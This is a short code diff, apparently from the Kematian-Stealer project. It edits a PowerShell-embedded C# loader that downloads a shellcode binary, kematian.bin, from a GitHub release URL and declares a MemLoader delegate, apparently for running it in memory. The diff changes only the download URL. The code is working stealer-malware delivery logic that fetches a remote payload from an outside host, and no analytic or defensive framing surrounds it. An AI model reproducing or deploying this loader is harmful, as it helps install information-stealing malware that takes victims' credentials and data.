@@ -11,7 +11,7 @@ function kematian {
         delegate void MemLoader();
 
         public static void Main() {
-            string url = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/download/AutoBuild/kematian.bin";
+            string url = "https://github.com/Chainski/Kematian-Stealer/releases/download/AutoBuild/kematian.bin";
             byte[] golangshc;
             using (WebClient client = new WebClient()) {
                 golangshc = client.DownloadData(url);
